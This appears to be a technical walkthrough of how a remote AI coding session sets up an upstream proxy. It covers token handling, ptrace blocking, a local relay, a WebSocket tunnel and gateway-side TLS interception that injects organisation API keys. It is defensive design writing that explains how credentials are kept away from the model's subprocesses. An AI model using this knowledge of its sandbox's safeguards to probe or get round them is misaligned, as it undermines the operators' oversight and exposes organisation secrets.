Here's the full initialization, end to end:

1. **Gate check**: Verify `CLAUDE_CODE_REMOTE`, `CCR_UPSTREAM_PROXY_ENABLED`, session ID.

2. **Read token**: Load session token from `/run/ccr/session_token` (tmpfs).

3. **Block ptrace**: `prctl(PR_SET_DUMPABLE, 0)` via Bun FFI to libc.

4. **Download CA**: Fetch gateway CA from `/v1/code/upstreamproxy/ca-cert`, merge with system bundle, write to `~/.ccr/ca-bundle.crt`.

5. **Start relay**: Bind TCP server to `127.0.0.1:0`, get ephemeral port.

6. **Unlink token**: Delete token file from disk. Token is now heap-only.

7. **Register env function**: Wire `getUpstreamProxyEnv()` into `subprocessEnv()`.

8. **Subprocess spawned**: Model runs `curl https://api.datadog.com/v1/metrics`. The subprocess inherits `HTTPS_PROXY=http://127.0.0.1:<port>` and `SSL_CERT_FILE=~/.ccr/ca-bundle.crt`.

9. **CONNECT request**: curl sends `CONNECT api.datadog.com:443 HTTP/1.1` to the local relay.

10. **WebSocket tunnel**: Relay opens WebSocket to CCR gateway, forwards the CONNECT line with `Proxy-Authorization`.

11. **Credential injection**: Gateway MITMs the TLS connection, injects org-configured headers (e.g., `DD-API-KEY`), forwards to the real upstream.

12. **Bidirectional relay**: Bytes flow: curl ↔ TCP ↔ protobuf chunks ↔ WebSocket ↔ gateway ↔ Datadog API.

Each layer assumes the others might fail. The token lifecycle assumes ptrace might not be blockable. The CA download assumes the endpoint might be down. The relay assumes TCP packets might be coalesced. The protobuf encoder assumes payloads might exceed buffer caps. And the entire system assumes it might not initialize at all — in which case, the session works normally without proxy capabilities, and the debug log explains why.
